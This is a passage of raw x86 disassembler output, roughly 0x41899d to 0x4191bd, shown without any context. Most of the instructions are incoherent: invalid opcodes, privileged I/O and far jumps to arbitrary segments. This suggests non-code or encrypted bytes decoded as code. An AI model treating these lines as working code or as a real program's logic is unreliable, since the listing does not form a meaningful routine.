  41899d:	ds loope 0x41897d
  4189a0:	mov    al,ds:0xf8e95021
  4189a5:	ret    0x410d
  4189a8:	sub    esp,0x8
  4189ab:	mov    ecx,0x5a589b24
  4189b0:	jmp    0x4189c3
  4189b2:	push   esi
  4189b3:	mov    ds:0xb3f707b9,al
  4189b8:	push   esp
  4189b9:	sbb    DWORD PTR [edx],ecx
  4189bb:	pusha  
  4189bc:	or     DWORD PTR [ecx],eax
  4189be:	adc    eax,0x5a057e2a
  4189c3:	xchg   ebp,eax
  4189c4:	or     bh,BYTE PTR [ebx+0x2c64d741]
  4189ca:	sub    bl,BYTE PTR [ebx+0x47]
  4189cd:	clc    
  4189ce:	repz or al,0x7c
  4189d1:	jnp    0x4189fe
  4189d3:	jo     0x418a47
  4189d5:	retf   
  4189d6:	sbb    BYTE PTR [ebx+0x4d],dh
  4189d9:	add    eax,0x47733cfa
  4189de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189df:	push   edx
  4189e0:	shl    BYTE PTR [edx+0x4f1e41f9],0xdf
  4189e7:	mov    esi,0x3a73c1b5
  4189ec:	hlt    
  4189ed:	shl    BYTE PTR [ebx],0x80
  4189f0:	out    dx,al
  4189f1:	add    BYTE PTR ss:[eax],cl
  4189f4:	shr    BYTE PTR [ecx-0x2e],cl
  4189f7:	pusha  
  4189f8:	jb     0x4189d3
  4189fa:	mov    dh,0xa0
  4189fc:	jmp    0x3e8:0xd10ac287
  418a03:	outs   dx,DWORD PTR ds:[esi]
  418a04:	pop    ebp
  418a05:	or     eax,0xdb4a6968
  418a0a:	add    bl,al
  418a0c:	xor    eax,0x9bc170a4
  418a11:	mov    BYTE PTR [esi+0x63],dh
  418a14:	or     ch,bl
  418a16:	sbb    BYTE PTR [ebx-0x3a144759],bl
  418a1c:	sub    eax,0xd5595e9f
  418a21:	mov    ecx,ebx
  418a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a24:	dec    esp
  418a25:	push   cs
  418a26:	sbb    BYTE PTR [edx],al
  418a28:	int    0xb7
  418a2a:	pop    ebp
  418a2b:	ret    0x1a0
  418a2e:	and    eax,0x1075ffea
  418a33:	add    eax,0xa6fb40d4
  418a38:	mov    edx,0x8db2f0ad
  418a3d:	dec    ebp
  418a3e:	(bad)  
  418a3f:	mov    dx,0xb263
  418a43:	xor    esi,DWORD PTR [ecx-0x66cffdcb]
  418a49:	retf   
  418a4a:	jo     0x418a5b
  418a4c:	cmp    al,0x0
  418a4e:	jb     0x418a39
  418a50:	(bad)  
  418a51:	and    bh,BYTE PTR [ebx-0x31]
  418a54:	adc    bh,ah
  418a56:	call   0xc1c9415e
  418a5b:	and    bl,BYTE PTR [edx+0xc]
  418a5e:	sub    ecx,eax
  418a60:	sbb    ecx,eax
  418a62:	xor    DWORD PTR [ebp-0x1f3bd250],0x3
  418a69:	xchg   esp,eax
  418a6a:	and    DWORD PTR [ecx],ecx
  418a6c:	fnstenv [esi]
  418a6e:	mov    esi,0xf16fdbc8
  418a73:	adc    BYTE PTR [ebx],dh
  418a75:	dec    esi
  418a76:	test   BYTE PTR [ebp+0xe1475d2],0xb9
  418a7d:	nop
  418a7e:	add    DWORD PTR [eax-0xe2ba3fe],esi
  418a84:	mov    eax,0x58207067
  418a89:	ss xchg edi,eax
  418a8b:	push   0xffffffb7
  418a8d:	outs   dx,DWORD PTR ds:[esi]
  418a8e:	inc    edi
  418a8f:	call   0xa88da0
  418a94:	dec    esi
  418a95:	jg     0x418a24
  418a97:	add    al,0x40
  418a99:	add    al,ch
  418a9b:	aam    0xee
  418a9d:	pop    ss
  418a9e:	bound  edx,QWORD PTR [ecx]
  418aa0:	pop    ds
  418aa1:	pop    ss
  418aa2:	inc    BYTE PTR [ecx]
  418aa4:	jb     0xe250e238
  418aaa:	sub    eax,0xf251b0c
  418aaf:	xchg   DWORD PTR [ebx-0x112692fc],eax
  418ab5:	outs   dx,BYTE PTR ds:[esi]
  418ab6:	jmp    0xc47082d
  418abb:	ja     0x418b34
  418abd:	or     edi,ebx
  418abf:	jno    0x418b3f
  418ac1:	aam    0xfd
  418ac3:	es add bh,0x20
  418ac7:	cmp    ebx,DWORD PTR [edx+eax*2-0x2]
  418acb:	ja     0x418b31
  418acd:	or     al,0x48
  418acf:	dec    DWORD PTR [ebx+0x112856c4]
  418ad5:	jg     0x418aed
  418ad7:	add    ebx,DWORD PTR [edx+ecx*2-0x2]
  418adb:	inc    ecx
  418adc:	dec    eax
  418add:	(bad)  
  418ade:	fdiv   DWORD PTR [edi-0x31e797fa]
  418ae4:	dec    ecx
  418ae5:	mov    eax,ecx
  418ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ae8:	cdq    
  418ae9:	idiv   esi
  418aeb:	imul   esi,ecx,0xe8aa496d
  418af1:	sub    BYTE PTR [esi-0x2249492f],ch
  418af7:	mov    ebp,0x2bf203f6
  418afc:	lock pop ds
  418afe:	mov    dh,0x1f
  418b00:	stc    
  418b01:	add    esi,eax
  418b03:	das    
  418b04:	ret    
  418b05:	add    al,0x84
  418b07:	test   DWORD PTR [esi],edx
  418b09:	loope  0x418a8c
  418b0b:	out    dx,al
  418b0c:	ret    
  418b0d:	cmp    eax,0x2c68f46e
  418b12:	sub    BYTE PTR [ecx],cl
  418b14:	and    eax,0x4ab4b364
  418b19:	push   ss
  418b1a:	xchg   esp,eax
  418b1b:	mov    dl,0xde
  418b1d:	pop    edx
  418b1e:	jmp    0xe84d:0xe46821c9
  418b25:	popa   
  418b26:	jg     0x418b8f
  418b28:	out    dx,al
  418b29:	xor    eax,0xc7499f34
  418b2e:	xchg   ebp,eax
  418b2f:	fld    DWORD PTR [edi]
  418b31:	hlt    
  418b32:	ss jo  0x418b0d
  418b35:	and    al,BYTE PTR [ebx+eax*1]
  418b38:	sub    dh,BYTE PTR [edi+0x25d05169]
  418b3e:	cmp    ch,cl
  418b40:	mov    eax,ds:0x491f4207
  418b45:	data16 loope 0x418bc5
  418b48:	mov    eax,ds:0xf9817a2f
  418b4d:	mov    cl,0x3a
  418b4f:	xor    eax,0xe981137c
  418b54:	pop    es
  418b55:	or     DWORD PTR [esi-0x3c92984a],eax
  418b5b:	mov    ds:0x60ed7d12,al
  418b60:	repnz das 
  418b62:	add    eax,0xf085e118
  418b67:	lahf   
  418b68:	lods   al,BYTE PTR ds:[esi]
  418b69:	mov    ss,WORD PTR [ecx-0x44389960]
  418b6f:	mov    ch,0xed
  418b71:	lods   eax,DWORD PTR ds:[esi]
  418b72:	add    al,0x4f
  418b74:	dec    WORD PTR [ebp+0x14]
  418b78:	sbb    DWORD PTR [esi+edx*1],0x1a1e6b66
  418b7f:	pop    edx
  418b80:	ins    BYTE PTR es:[edi],dx
  418b81:	popa   
  418b82:	fs add ebx,eax
  418b85:	sub    DWORD PTR [ecx*8-0x67d2130e],edx
  418b8c:	pop    ebp
  418b8d:	mov    ch,0x5
  418b8f:	sub    al,0x9e
  418b91:	shl    eax,0x2
  418b94:	sbb    eax,0x8c2b00da
  418b99:	sbb    BYTE PTR [edx+0x15],cl
  418b9c:	and    BYTE PTR [edx-0x75],al
  418b9f:	fsub   DWORD PTR [edi]
  418ba1:	pop    ebp
  418ba2:	jb     0x418b4c
  418ba4:	add    DWORD PTR [esi],ebx
  418ba6:	or     BYTE PTR [ebx-0x543d754e],bh
  418bac:	in     al,dx
  418bad:	data16 fdiv QWORD PTR [ebp+0x3f5b5737]
  418bb4:	enter  0x5690,0x4c
  418bb8:	dec    esi
  418bb9:	(bad)  
  418bba:	mov    esp,0xcd6dbb9b
  418bbf:	test   DWORD PTR ss:[esi+0x3b],0x90b7207
  418bc7:	or     eax,0x47368229
  418bcc:	das    
  418bcd:	inc    eax
  418bce:	jmp    0x418bac
  418bd0:	int    0x1b
  418bd2:	sbb    DWORD PTR [esi-0x372ba32a],esi
  418bd8:	add    DWORD PTR [eax-0x270bf5ee],eax
  418bde:	sbb    BYTE PTR [eax+0x5ec28b6e],dh
  418be4:	sub    edx,DWORD PTR [ecx+0x5e]
  418be7:	lock inc esi
  418be9:	mov    ds:0x23f66ae,al
  418bee:	es (bad) 
  418bf0:	push   ds
  418bf1:	push   0x946228c1
  418bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bf7:	fiadd  DWORD PTR [ebx+0x61c60e13]
  418bfd:	push   ds
  418bfe:	clc    
  418bff:	retf   0xb9fc
  418c02:	aaa    
  418c03:	mov    cl,0x14
  418c05:	xchg   ebx,eax
  418c06:	mov    dh,0xf9
  418c08:	dec    ecx
  418c09:	inc    eax
  418c0a:	add    al,0xa0
  418c0c:	push   esp
  418c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c0e:	daa    
  418c0f:	mov    cl,BYTE PTR ds:0x64667caf
  418c15:	adc    bh,al
  418c17:	push   esp
  418c18:	xchg   esp,eax
  418c19:	xor    dh,BYTE PTR [ecx*2-0x5455f23a]
  418c20:	fsub   DWORD PTR [edx-0x2cc50367]
  418c26:	push   eax
  418c27:	scas   eax,DWORD PTR es:[edi]
  418c28:	and    esp,DWORD PTR [eax+0x1a42daab]
  418c2e:	in     al,dx
  418c2f:	xchg   edx,eax
  418c30:	adc    dl,BYTE PTR [ecx-0x37]
  418c33:	adc    DWORD PTR [edi+0x20],esi
  418c36:	lea    edx,[ecx+edx*1-0x5aafee95]
  418c3d:	test   DWORD PTR [ecx],0x98010856
  418c43:	sbb    edi,eax
  418c45:	and    cl,dl
  418c47:	sub    esp,DWORD PTR [esi-0xd]
  418c4a:	sub    DWORD PTR [edi-0x7d7b04f4],ebp
  418c50:	sub    eax,0x1f59b869
  418c55:	ss jle 0x418c0b
  418c58:	pop    esp
  418c59:	pop    ebx
  418c5a:	dec    ebp
  418c5b:	and    eax,0xe03f046a
  418c60:	int    0xd4
  418c62:	scas   al,BYTE PTR es:[edi]
  418c63:	ss ss in al,0x80
  418c67:	call   0x6af4a432
  418c6c:	jo     0x418ccb
  418c6e:	mov    ds:0x58b9d9e0,al
  418c73:	and    DWORD PTR [ebx-0x2b28cc46],edi
  418c79:	add    al,0x67
  418c7b:	fcmovbe st,st(0)
  418c7d:	push   cs
  418c7e:	inc    edi
  418c7f:	push   es
  418c80:	outs   dx,BYTE PTR ds:[esi]
  418c81:	mov    al,0x8
  418c83:	or     ebp,DWORD PTR [edi-0x56fbbcaf]
  418c89:	sub    BYTE PTR [ebx-0x7fefab73],0xf1
  418c90:	sub    ebp,ebp
  418c92:	mov    ds:0x8a10bbbd,al
  418c97:	adc    ah,BYTE PTR [ecx+0x74fb513a]
  418c9d:	pusha  
  418c9e:	dec    esp
  418c9f:	cld    
  418ca0:	inc    eax
  418ca1:	mov    eax,0xb8dc560b
  418ca6:	mov    DWORD PTR [edx-0xc],eax
  418ca9:	xchg   edi,eax
  418caa:	cmp    BYTE PTR cs:[eax-0x13],0xed
  418caf:	(bad)  
  418cb0:	sub    esi,DWORD PTR [esi]
  418cb2:	adc    DWORD PTR [edx],ebp
  418cb4:	retf   
  418cb5:	mov    DWORD PTR [eax+0xc],esi
  418cb8:	add    al,dh
  418cba:	jle    0x418cf3
  418cbc:	adc    eax,edx
  418cbe:	ror    BYTE PTR [eax-0x12],cl
  418cc1:	add    eax,0xf24ff050
  418cc6:	cmp    DWORD PTR [ebp+edi*4+0xa5c68fb],ebp
  418ccd:	mov    BYTE PTR [eax-0x13],0x1
  418cd1:	cmp    DWORD PTR [edi],esi
  418cd3:	jecxz  0x418cee
  418cd5:	mov    ebx,0x2b316485
  418cda:	in     al,0x50
  418cdc:	ds out 0x3a,al
  418cdf:	mov    dl,0x19
  418ce1:	sbb    eax,ebp
  418ce3:	jmp    0x30a2:0x1e3a466
  418cea:	pop    es
  418ceb:	or     ebx,edi
  418ced:	in     al,0xfe
  418cef:	dec    esi
  418cf0:	aam    0xc6
  418cf2:	fist   DWORD PTR [ecx*4-0x3103fff7]
  418cf9:	and    DWORD PTR [esi+0x65282adc],eax
  418cff:	jl     0x418d39
  418d01:	lods   al,BYTE PTR ds:[esi]
  418d02:	push   ecx
  418d03:	fiadd  WORD PTR ss:[ebx+0x1c]
  418d07:	inc    eax
  418d08:	aaa    
  418d09:	or     ch,BYTE PTR [esi-0xfe65b1a]
  418d0f:	jmp    0xfc3:0x20aceeee
  418d16:	fdivr  QWORD PTR [edx-0x7febca84]
  418d1c:	push   0x462b14ad
  418d21:	ss mov dh,0xe8
  418d24:	cld    
  418d25:	mov    ss,WORD PTR [edi+ecx*1]
  418d28:	add    eax,0xdf59b207
  418d2d:	mov    ah,0xb
  418d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d30:	das    
  418d31:	jmp    0x9537:0x55a5f695
  418d38:	mul    DWORD PTR [edi-0x46d5821e]
  418d3e:	xor    eax,0x850f4e59
  418d43:	mov    WORD PTR [eax],ds
  418d45:	mov    esp,0xa178a06d
  418d4a:	cmp    al,0x7
  418d4c:	inc    ecx
  418d4d:	(bad)  
  418d4e:	je     0x418d72
  418d50:	add    al,0xd
  418d52:	jne    0x418dd1
  418d54:	popf   
  418d55:	inc    ebp
  418d56:	adc    eax,0xe51c32a
  418d5b:	xchg   ecx,eax
  418d5c:	imul   DWORD PTR [ebp-0x37cb49a8]
  418d62:	or     eax,0x3d83602a
  418d67:	inc    eax
  418d68:	sub    al,0x6f
  418d6a:	or     BYTE PTR [ebp+0x9],ch
  418d6d:	jle    0x418dc6
  418d6f:	push   ss
  418d70:	loop   0x418d7a
  418d72:	dec    edi
  418d73:	mov    edx,0x888fc51b
  418d78:	xor    DWORD PTR [ebp+0x42],0x9c90032b
  418d7f:	imul   ebp,DWORD PTR [esi-0x6d9399fb],0x48
  418d86:	scas   eax,DWORD PTR es:[edi]
  418d87:	mov    ds:0xabec4f8,eax
  418d8c:	xlat   BYTE PTR ds:[ebx]
  418d8d:	je     0x418da4
  418d8f:	mov    ecx,DWORD PTR ds:0x13b0ece0
  418d95:	or     BYTE PTR [ebx-0x3d],ah
  418d98:	sbb    ebp,DWORD PTR [ecx+eiz*2]
  418d9b:	out    0x26,al
  418d9d:	mov    eax,ds:0x36e46cfb
  418da2:	sbb    BYTE PTR [eax],bl
  418da4:	nop
  418da5:	or     dl,BYTE PTR [edi]
  418da7:	mul    edx
  418da9:	in     eax,0xd0
  418dab:	dec    esi
  418dac:	push   esi
  418dad:	int3   
  418dae:	or     bh,dh
  418db0:	addr16 addr16 add esi,edx
  418db4:	adc    al,BYTE PTR [esi+0x65ec6b8c]
  418dba:	pop    esi
  418dbb:	jge    0x418e19
  418dbd:	jb     0x418d88
  418dbf:	adc    al,0xec
  418dc1:	out    dx,al
  418dc2:	repnz sbb al,0xe4
  418dc5:	ret    
  418dc6:	or     ebx,DWORD PTR [esi+0x2]
  418dc9:	jg     0x418dda
  418dcb:	push   0x74
  418dcd:	jge    0x418dba
  418dcf:	or     eax,0x3e42e486
  418dd4:	jns    0x418d56
  418dd6:	jge    0x418dc4
  418dd8:	in     al,dx
  418dd9:	push   ss
  418dda:	repnz lock dec eax
  418ddd:	je     0x418e12
  418ddf:	jne    0x418dcd
  418de1:	inc    ebx
  418de2:	clc    
  418de3:	or     eax,DWORD PTR [ebp+0x38802794]
  418de9:	xor    BYTE PTR [ebp+0x17],dh
  418dec:	push   ebx
  418ded:	inc    esp
  418dee:	mov    ds:0xc8c34860,eax
  418df3:	dec    ecx
  418df4:	gs add bh,bh
  418df7:	dec    ebp
  418df8:	xchg   ah,cl
  418dfa:	and    eax,0xbdf0f86e
  418dff:	enter  0x93d8,0xf7
  418e03:	jns    0x418e7e
  418e05:	add    BYTE PTR [ebx],cl
  418e07:	add    al,0xd
  418e09:	push   es
  418e0a:	test   al,0x9c
  418e0c:	add    edi,esi
  418e0e:	aam    0x6d
  418e10:	push   gs
  418e12:	mov    DWORD PTR [esi-0x7427fd2c],esi
  418e18:	jne    0x418db3
  418e1a:	mov    ecx,0x2ec82a61
  418e1f:	test   DWORD PTR [edi+0x6d075d16],ebx
  418e25:	pop    ebp
  418e26:	rol    DWORD PTR [edi-0x4a],1
  418e29:	mov    eax,0x4df1023e
  418e2e:	jb     0x418deb
  418e30:	je     0x418dd0
  418e32:	ud0    eax,DWORD PTR [eax+0x320e292]
  418e39:	in     eax,dx
  418e3a:	add    BYTE PTR [ebp-0x1c32ac18],ah
  418e40:	loope  0x418dfe
  418e42:	je     0x418e3f
  418e44:	les    edx,FWORD PTR [edi+0x51]
  418e47:	add    BYTE PTR [ebx-0x22],0x11
  418e4b:	js     0x418e93
  418e4d:	sub    ah,BYTE PTR [ebp-0x6]
  418e50:	bt     DWORD PTR ds:0xf549ae04,eax
  418e57:	push   es
  418e58:	jbe    0x418ed4
  418e5a:	gs mov ebx,ebp
  418e5d:	xchg   ecx,eax
  418e5e:	or     BYTE PTR [ebp-0x132787f0],ch
  418e64:	jge    0x418de6
  418e66:	mov    DWORD PTR [esi],eax
  418e68:	dec    edx
  418e69:	adc    DWORD PTR ds:[edx-0x77798a3],ecx
  418e70:	and    eax,0x2c9f04ea
  418e75:	sbb    dh,BYTE PTR [ebx-0x4a]
  418e78:	or     al,BYTE PTR [edx+0x6b]
  418e7b:	add    ecx,DWORD PTR [edi+edi*4-0x5d]
  418e7f:	dec    ebp
  418e80:	mov    edx,0x37c4564
  418e85:	loop   0x418e69
  418e87:	dec    eax
  418e88:	arpl   WORD PTR [esi-0x78],cx
  418e8b:	pop    ebp
  418e8c:	loop   0x418e43
  418e8e:	push   es
  418e8f:	sbb    esp,DWORD PTR [ebx+0x1d]
  418e92:	ficomp WORD PTR [ebx+0x38]
  418e95:	loop   0x418ed1
  418e97:	rcr    ch,1
  418e99:	aam    0x1d
  418e9b:	mov    bh,0x80
  418e9d:	outs   dx,DWORD PTR ds:[esi]
  418e9e:	jle    0x418e98
  418ea0:	and    al,0x85
  418ea2:	test   al,0x6
  418ea4:	wbinvd 
  418ea6:	les    ecx,FWORD PTR [ecx+0x3]
  418ea9:	fisttp DWORD PTR [edi]
  418eab:	or     eax,0x3fe7bdc1
  418eb0:	xor    cl,BYTE PTR [esi]
  418eb2:	or     eax,DWORD PTR [eax]
  418eb4:	or     al,0x5
  418eb6:	add    eax,DWORD PTR [eax]
  418eb8:	add    al,BYTE PTR [esi]
  418eba:	pop    es
  418ebb:	add    eax,0x4a227e19
  418ec0:	outs   dx,BYTE PTR ds:[esi]
  418ec1:	adc    ecx,DWORD PTR [edx]
  418ec3:	in     eax,dx
  418ec4:	test   ch,al
  418ec6:	ins    BYTE PTR es:[edi],dx
  418ec7:	call   0x37f:0x3740db66
  418ece:	fs xchg ecx,eax
  418ed0:	mul    BYTE PTR [ebx+0x66cb3480]
  418ed6:	mov    ecx,0x18e781b6
  418edb:	or     BYTE PTR [ebp+0x7e],0x35
  418edf:	pop    ebp
  418ee0:	out    0xda,eax
  418ee2:	test   DWORD PTR [ebx+0x37b336f],0xa0d1559a
  418eec:	mov    ds,ebp
  418eee:	ret    
  418eef:	push   0x68
  418ef1:	pop    ecx
  418ef2:	push   es
  418ef3:	cwde   
  418ef4:	pop    ecx
  418ef5:	cs inc ecx
  418ef7:	loop   0x418e7c
  418ef9:	mov    bh,0x2c
  418efb:	and    edi,edi
  418efd:	and    eax,0x1f66ecb9
  418f02:	inc    edx
  418f03:	xor    ecx,0x1c6ad06d
  418f09:	pop    ecx
  418f0a:	sti    
  418f0b:	or     ebx,DWORD PTR [ebx-0x28]
  418f0e:	shl    DWORD PTR [edx],0xba
  418f11:	add    al,0x17
  418f13:	dec    esi
  418f14:	in     al,dx
  418f15:	dec    esp
  418f16:	adc    al,0x7e
  418f18:	and    eax,0x3b38d55
  418f1d:	adc    BYTE PTR [ebx+0x10],ch
  418f20:	xchg   ebx,eax
  418f21:	and    DWORD PTR [edi+edx*8-0x28],0xd4fc692c
  418f29:	or     BYTE PTR [esi],cl
  418f2b:	and    al,0xcd
  418f2d:	ins    BYTE PTR es:[edi],dx
  418f2e:	jl     0x418f04
  418f30:	hlt    
  418f31:	dec    eax
  418f32:	sub    ah,BYTE PTR [esi+0x2f]
  418f35:	mov    ecx,0xeb18e788
  418f3a:	xor    BYTE PTR [ecx+ebp*4-0x7f426a49],cl
  418f41:	mov    ds:0x9c850415,al
  418f46:	(bad)  
  418f47:	fnstcw WORD PTR [ecx]
  418f49:	mov    dl,0x99
  418f4b:	dec    edx
  418f4c:	sbb    esp,ecx
  418f4e:	fs mov ebp,0x5d4b0d54
  418f54:	std    
  418f55:	dec    eax
  418f56:	je     0x418fa1
  418f58:	sub    edi,ecx
  418f5a:	xchg   esi,eax
  418f5b:	mov    ebp,0x7feb6d02
  418f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f61:	push   0xffffffee
  418f63:	or     al,0x7d
  418f65:	adc    esi,DWORD PTR [eax+0x3]
  418f68:	dec    ebp
  418f69:	dec    esi
  418f6a:	jl     0x418f4b
  418f6c:	jns    0x418efe
  418f6e:	sub    eax,0x26fc5de9
  418f73:	sbb    BYTE PTR [edi],al
  418f75:	push   es
  418f76:	in     al,dx
  418f77:	fldcw  WORD PTR [ecx]
  418f79:	mov    eax,ds:0x846d3a84
  418f7e:	adc    ecx,DWORD PTR [eax+0x4b091e36]
  418f84:	adc    eax,edx
  418f86:	pop    ecx
  418f87:	xchg   esi,eax
  418f88:	loopne 0x418f14
  418f8a:	fst    QWORD PTR [edx+0x1]
  418f8d:	mov    eax,ds:0x711bdc1d
  418f92:	gs mov eax,0x8651a309
  418f98:	fcmovnbe st,st(5)
  418f9a:	adc    BYTE PTR [edx],dl
  418f9c:	das    
  418f9d:	(bad)  
  418f9e:	retf   
  418f9f:	scas   ax,WORD PTR es:[edi]
  418fa1:	and    cl,BYTE PTR [edi]
  418fa3:	mov    dh,0x74
  418fa5:	dec    eax
  418fa6:	jg     0x418fbf
  418fa8:	fistp  DWORD PTR [edi]
  418faa:	adc    eax,0xfd823c4b
  418faf:	and    dh,BYTE PTR [esi+eiz*2+0x4]
  418fb3:	add    eax,0xcbff97ab
  418fb8:	je     0x41901b
  418fba:	sbb    dh,BYTE PTR [esi+ecx*1-0x15]
  418fbe:	bound  eax,QWORD PTR [ebx+0x77461e8]
  418fc4:	pop    es
  418fc5:	je     0x41902e
  418fc7:	push   0x46b746a6
  418fcc:	enter  0x755e,0x50
  418fd0:	xor    eax,0xecf5dd73
  418fd5:	add    al,0xfa
  418fd7:	dec    ebp
  418fd8:	pop    eax
  418fd9:	enter  0x2c16,0xba
  418fdd:	inc    esp
  418fde:	and    edi,ecx
  418fe0:	pop    ss
  418fe1:	repnz adc eax,0x48ba1603
  418fe7:	add    al,0xde
  418fe9:	outs   dx,BYTE PTR ds:[esi]
  418fea:	cmp    dh,BYTE PTR gs:[ebp+0x1d]
  418fee:	jl     0x418fb3
  418ff0:	pop    ss
  418ff1:	mov    ch,BYTE PTR [esp+esi*1-0x5f8577ff]
  418ff8:	pop    esp
  418ff9:	fild   DWORD PTR [edi+edi*8]
  418ffc:	sbb    DWORD PTR [esp+ebp*4],ebx
  418fff:	dec    edx
  419000:	add    DWORD PTR [edi-0x74caf913],esi
  419006:	jge    0x418ff2
  419008:	push   0x6615dbe1
  41900d:	aas    
  41900e:	mov    edx,0x6c80bc5
  419013:	mov    di,0xeb28
  419017:	or     al,BYTE PTR [esi+esi*2]
  41901a:	add    al,0xa
  41901c:	adc    DWORD PTR [edi],edi
  41901e:	cs out dx,eax
  419020:	or     al,0x9d
  419022:	jle    0x41902b
  419024:	jo     0x419087
  419026:	or     DWORD PTR [edi],esp
  419028:	cmp    al,0x8c
  41902a:	mov    edi,eax
  41902c:	mov    BYTE PTR [edx],dl
  41902e:	cmp    DWORD PTR [eax],ecx
  419030:	pusha  
  419031:	sub    ebp,DWORD PTR [edi]
  419033:	mov    ch,BYTE PTR [edx]
  419035:	or     DWORD PTR [eax*4+0x790e630],0x578653
  419040:	test   eax,0x48374898
  419045:	push   es
  419046:	pushf  
  419047:	gs add edx,edi
  41904a:	add    BYTE PTR [edx-0x37],dh
  41904d:	add    esp,esp
  41904f:	shl    BYTE PTR [ebx-0x30],1
  419052:	add    eax,DWORD PTR [ebx+eax*2]
  419055:	dec    eax
  419056:	lods   eax,DWORD PTR ds:[esi]
  419057:	je     0x4190ce
  419059:	sub    DWORD PTR [edx],edi
  41905b:	inc    ebp
  41905c:	fcmovnu st,st(0)
  41905e:	mov    ecx,0x83ff0cea
  419063:	adc    dl,BYTE PTR [eax+0x76]
  419066:	clc    
  419067:	imul   esi,DWORD PTR [esi-0x60],0x1f
  41906b:	lods   al,BYTE PTR ds:[esi]
  41906c:	add    DWORD PTR [esi],0x4
  41906f:	push   0x2b61724b
  419074:	and    DWORD PTR [ebp+0x2584023e],ebx
  41907a:	pop    ss
  41907b:	xor    al,BYTE PTR [ecx]
  41907d:	add    al,dh
  41907f:	(bad)  
  419080:	fdiv   DWORD PTR [ecx+0x733e3303]
  419086:	adc    esp,ebp
  419088:	nop
  419089:	in     eax,0x6c
  41908b:	dec    ecx
  41908c:	(bad)  
  41908d:	dec    esi
  41908e:	jmp    0x41909f
  419090:	adc    BYTE PTR [eax+ecx*2+0x200d2503],dl
  419097:	xchg   edi,eax
  419098:	push   eax
  419099:	xor    DWORD PTR [edi+0x39],edx
  41909c:	jae    0x41903f
  41909e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41909f:	sbb    cl,BYTE PTR [edx+0x46]
  4190a2:	pop    eax
  4190a3:	pop    ebx
  4190a4:	shl    BYTE PTR [edx],cl
  4190a6:	in     al,0x3
  4190a8:	mov    dl,bl
  4190aa:	lds    esi,FWORD PTR [esi]
  4190ac:	dec    eax
  4190ad:	and    BYTE PTR [esi+0x24f7fb8e],0xa4
  4190b4:	nop
  4190b5:	jl     0x4190b7
  4190b7:	mov    eax,0xbd2dd282
  4190bc:	and    BYTE PTR [esi+0x61204f4],cl
  4190c2:	call   0xcd48d2d5
  4190c7:	or     esp,esi
  4190c9:	jbe    0x41909d
  4190cb:	les    edi,FWORD PTR [eax+0x2300f5c]
  4190d1:	out    0x97,al
  4190d3:	dec    esi
  4190d4:	pop    es
  4190d5:	cmp    BYTE PTR ds:0xb9d21bd9,0x81
  4190dc:	adc    BYTE PTR [ebx*4-0x27377cf1],dh
  4190e3:	sbb    esp,DWORD PTR [di]
  4190e6:	mov    WORD PTR [ebx+edi*2+0x21],?
  4190ea:	mov    WORD PTR [edx-0x14a16e26],ss
  4190f0:	gs in  al,0xeb
  4190f3:	pop    ds
  4190f4:	push   es
  4190f5:	loopne 0x4190c1
  4190f7:	push   ecx
  4190f8:	xor    bl,BYTE PTR [eax]
  4190fa:	or     ecx,DWORD PTR [edi-0x5fd88fc0]
  419100:	lea    esp,[eax+0x25255380]
  419106:	stc    
  419107:	xchg   DWORD PTR [esi],ebp
  419109:	nop
  41910a:	shl    esp,1
  41910c:	mov    edx,DWORD PTR [esi]
  41910e:	sub    edx,DWORD PTR [ebp-0x24]
  419111:	fimul  WORD PTR [edx-0x48]
  419114:	popf   
  419115:	and    DWORD PTR [esi],edx
  419117:	sub    ch,bl
  419119:	adc    cl,BYTE PTR [esp+ebx*1]
  41911c:	xchg   esp,eax
  41911d:	js     0x419147
  41911f:	fwait
  419120:	xchg   esp,eax
  419121:	(bad)  
  419123:	dec    edi
  419124:	mov    BYTE PTR [ebx+0x6],al
  419127:	iret   
  419128:	dec    ecx
  419129:	mov    ds:0xd48535ca,al
  41912e:	adc    esp,DWORD PTR [ecx+0x2c1e241a]
  419134:	or     al,0xcf
  419136:	jmp    0x41918d
  419138:	mov    dh,0xe6
  41913a:	mov    BYTE PTR [edi],bh
  41913c:	inc    ecx
  41913d:	dec    ebp
  41913e:	das    
  41913f:	push   eax
  419140:	dec    ebp
  419141:	add    DWORD PTR [esi],eax
  419143:	add    ecx,DWORD PTR [ebp-0x60]
  419146:	cmp    BYTE PTR [ecx],0xf7
  419149:	or     cl,BYTE PTR [ebx]
  41914b:	add    BYTE PTR [edi],al
  41914d:	or     al,0x59
  419150:	mov    eax,0xbcf8df5d
  419155:	ja     0x419141
  419157:	mov    WORD PTR [edi],cs
  419159:	test   DWORD PTR [ebx+0x7],edi
  41915c:	adc    eax,0x5573613f
  419161:	xchg   ebp,eax
  419162:	and    al,bl
  419164:	cmp    ebp,ebx
  419166:	or     al,0x55
  419168:	mov    eax,0xb998b45e
  41916d:	mov    eax,0x24820d73
  419172:	sub    al,BYTE PTR [edx+0x6f]
  419175:	mov    DWORD PTR [eax],ecx
  419177:	lea    esi,[eax]
  419179:	push   0xcefb3566
  41917e:	push   ebp
  41917f:	or     BYTE PTR [edi+0x43],bl
  419182:	pop    ebx
  419183:	cmp    BYTE PTR [esi],al
  419185:	lock jbe 0x419195
  419188:	mov    ebx,0x1a5c751e
  41918d:	inc    edi
  41918e:	or     al,0xa0
  419190:	adc    DWORD PTR [edi+ebx*1],ecx
  419193:	loope  0x419168
  419195:	inc    ecx
  419196:	pop    ds
  419197:	and    edi,eax
  419199:	cmp    ebx,eax
  41919b:	jg     0x419185
  41919d:	je     0x41918c
  41919f:	mov    DWORD PTR [edi],ebx
  4191a1:	xor    DWORD PTR [ecx+0x74],ebx
  4191a4:	dec    eax
  4191a5:	fwait
  4191a6:	hlt    
  4191a7:	or     al,bh
  4191a9:	mov    esi,0xbbb0f0ce
  4191ae:	mul    DWORD PTR [esi-0x38f1533a]
  4191b4:	dec    esp
  4191b5:	int3   
  4191b6:	jno    0x419223
  4191b8:	jge    0x4191db
  4191ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191bb:	mov    ebx,DWORD PTR [ebx]
  4191bd:	xor    esi,esi
